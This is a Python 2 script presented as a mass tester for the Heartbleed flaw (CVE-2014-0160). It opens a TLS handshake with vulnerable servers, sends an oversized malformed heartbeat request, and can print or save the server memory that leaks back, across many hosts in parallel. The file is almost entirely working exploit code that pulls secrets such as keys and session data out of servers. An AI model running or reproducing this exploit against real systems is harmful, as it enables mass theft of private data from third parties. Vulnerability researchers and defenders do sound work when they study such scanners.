#################################################################################
#     File Name           :     heartBleed.py
#     Created By          :     Jone Casper(xu.chenhui@live.com)
#     Creation Date       :     [2014-04-14 12:57]
#     Last Modified       :     [2014-04-20 12:57]
#     Description         :     Test for SSL heartbleed vulnerability
#################################################################################
#!/usr/bin/env python


import sys, socket, time, select, logging
import struct 
def h2bin(x):
    return x.replace(' ', '').replace('\n', '').decode('hex')

def bin2h(x):
    return  " ".join("{:02x}".format(ord(c)) for c in x)

#Thanks for https://github.com/musalbas/heartbleed-masstest
hello = h2bin('''
16 03 03 00 dc 01 00 00  d8 03 03 53
43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
00 0f 00 01 01                                  
''')
#hbpkt = h2bin("01 4e 20") + "\x01"*20000
#hb = h2bin("18 03 03 40 00") + hbpkt[0:16384] + h2bin("18 03 03 0e 23") + hbpkt[16384:]

hb  = h2bin("18 03 03 40 00 01 3f fd") + "\x01"*16381 + h2bin("18 03 03 00 03 01 00 00")

class heartBleed:

    #The ssl socket object
    _connsock = None
    #The original socket
    _epoll = None
    _releaseEpoll = False
    _error = None
    _connumber = 0

    def __init__(self, domain, port=443, acode=None, conn_timeout=10, epoll=None, loggerLevel=logging.WARNING):
        self.domain = domain
        self.port = port
        self.connected = False
        if epoll is not None:
            self._epoll = epoll
        else:
            self._epoll = select.epoll()
            self._releaseEpoll = True
        self.conn_timeout = conn_timeout
        self.hb = acode if acode is not None else hb 

        #Logger
        self.logger = logging.getLogger('heartbleed_tester')
        self.logger.setLevel(loggerLevel)
        hd = logging.StreamHandler()
        self.logger.addHandler(hd)

    def _initsock(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5) 
        try:
            s.connect((self.domain, self.port))
        except Exception,e:
            self._error = "Connect failed! " + str(e)
            s = None
        
        if s is not None:
            self._epoll.register(s.fileno(), select.EPOLLIN)
        return s
            
    def _colsesock(self):
        sock = self.connsocket
        if sock is not None:
            try:
                self._epoll.unregister(sock.fileno())
            except:
                pass
            #force close
            sock.close()
        if self._releaseEpoll:
            self._epoll.close()
     
    def _recvall(self, sock, l=None, timeout=5):
        sockfno = sock.fileno()
        _data = ""
        _end = False

        enterTime = time.time()
        while time.time()-enterTime < timeout:
            events = self._epoll.poll(1)
            for fileno, event in events:
                if fileno == sockfno and event and select.EPOLLIN:
                    if l is not None:
                        _data += sock.recv(l)
                        if len(_data) >= l:
                            _end = True
                    else:
                        res = sock.recv(1024)
                        if res is None or len(res) < 1024:
                            _end = True
                        _data += res
                elif fileno == sockfno and event and select.EPOLLHUP:
                    epoll.unregister(fileno)
                    _end = True
            if _end:
                break;
        return _data

    def recvSSLMsg(self):
        sock = self.connsocket
        self.logger.debug("Response:------------------")
        
        msg = self._recvall(sock, l=5, timeout=self.conn_timeout)
        self.logger.debug("Recv Header:" + bin2h(msg))
        
        type, ver, ln = self._getSSLHeader(msg)
        if ln is None:
            return None,None,None,None
        self.logger.debug("   type:" + hex(type))
        self.logger.debug("   version:" + hex(ver))
        self.logger.debug("   length:" + hex(ln))
   

        pay = self._recvall(sock, l=ln, timeout=self.conn_timeout)
        self.logger.debug("Recv Payload:" + bin2h(pay))
        self.logger.debug("---------------------------")
        
        return type, ver, ln, pay

    def unpackHeartBeat(self, pay):
        if len(pay) >= 3:
            header = pay[:3]
            h, l = struct.unpack('>BH', header)
            return h, l, pay[3:]
        return None, None, None
        
    def _getSSLHeader(self, msg):
        if len(msg) >= 5:
            header = msg[:5]
            return struct.unpack('>BHH', header)
        return None, None, None

    def _getSSLPay(self, msg):
        type, ver, ln = self._getSSLHeader(msg)
        if ln is not None:
            return msg[5:5+ln]
        return None

    def unpack_handshake(self, pay):
        """
        Unpack the SSL handshake in Multiple Handshake Message 
        """
        paylen = len(pay)
        offset = 0
        payarr = []

        while offset < paylen:
            h = pay[offset:offset + 4]
            t, l24 = struct.unpack('>B3s', h)
            l = struct.unpack('>I', '\x00' + l24)[0] 
            payarr.append((
                t,
                l,
                pay[offset+4:offset+4+l]
            ))
            offset = offset+l+4
        return payarr

    @property
    def connsocket(self):
        if self._connsock is None:
            self._connsock = self._initsock()
        return self._connsock

    def _test(self, sock):
        self.logger.debug("Send:------------------")
        sock.send(self.hb)
        self.logger.debug(bin2h(self.hb))
        self.logger.debug("-----------------------")

        type, ver, ln, pay = self.recvSSLMsg()

        is_vulnerable = False
        if type is None:
            self._error = "Failed: The package is incompletable!"
        elif type == 21:
            return False
        elif type == 24:
            #self._error = " ".join("{:02x}".format(ord(c)) for c in pay)
            self._error = pay
            return True
            #if len(pay) > 3:
            #    is_vulnerable = True
        else:
            self._error = "Failed: Can not receive the response."

        return is_vulnerable

    
    def _run(self):
        sock = self.connsocket
        if sock is None:
            return False

        sock.send(hello)
        while True:
            type, ver, ln, pay = self.recvSSLMsg()
            if type is None:
                self._error = "SSL connect failed!"
                return False

            self.hb = self.hb[:2] + chr(ver&0xff) + self.hb[3:16391] + chr(ver&0xff) + self.hb[16392:]
            if type == 22:
                payarr = self.unpack_handshake(pay)
                # Look for server hello done message.
                finddone = [t for t, l, p in payarr if t == 14]
                if len(finddone) > 0:
                    break
       
        is_vulnerable = self._test(sock)              
        self._colsesock()
        return is_vulnerable

    def run(self):
        #run 
        res = self._run()
        if res:
            print "Danger! The domain " + self.domain + " is vulnerable!"
        #else:
        #    print "Congratulation! The domain " + self.domain + " is not vulnerable!"


if __name__ == "__main__":
    from optparse import OptionParser
    import os.path
    options = OptionParser(usage='%prog <network> [network2] [network3] ...', description='Test for SSL heartbleed vulnerability (CVE-2014-0160)')
    options.add_option('-p', dest="port", default=443 ,type="int", help="SSL connect port.")
    options.add_option('-t', dest="timeout", default=10,type="int", help="SSL connect timeout.")
    options.add_option('-o', dest="outpay", action="store_true", help="Output the data when the server is vulnerable.")
    options.add_option('-f', dest="outtofile", help="Output the data to a file when the server is vulnerable.")
    options.add_option('--threads', dest="threads", default=100, help="Thread number, defaut is 5.")
    options.add_option('--debug', dest="debug", action="store_true", help="Debug Model.")
    opts, args = options.parse_args()

    if not args:
        options.print_help()
        sys.exit(-1)

    networks = args
    
    epoll = select.epoll()
    def scan(host):
        test = heartBleed(host, epoll=epoll, conn_timeout=opts.timeout, port=opts.port)
        if opts.debug:
            test.logger.setLevel(logging.DEBUG)
        res = test._run()
        if res:
            print "The domain " + test.domain + " is vulnerable!"
            if opts.outpay:
                h, l, p = test.unpackHeartBeat(test._error)
                print " ".join("{:02x}".format(ord(c)) for c in p)
            if opts.outtofile is not None and \
               len(opts.outtofile)>0:
                try:
                    with open(opts.outtofile,"wb") as fd:
                        fd.write(test._error)
                except Exception,e:
                    print str(e)

        elif test._error is not None:
            print "Scan domain[" +  test.domain + "] error: " + test._error
        else:
            print "The domain " + test.domain + " is NOT vulnerable."

    tNum = int(opts.threads)
    if tNum > 1:
        from multiprocessing import Pool
        threadpool = Pool(processes=int(opts.threads))
        task = threadpool.map(scan, networks)
        threadpool.close()
        threadpool.join()
    else:
        for host in networks:
            scan(host)
    epoll.close()   
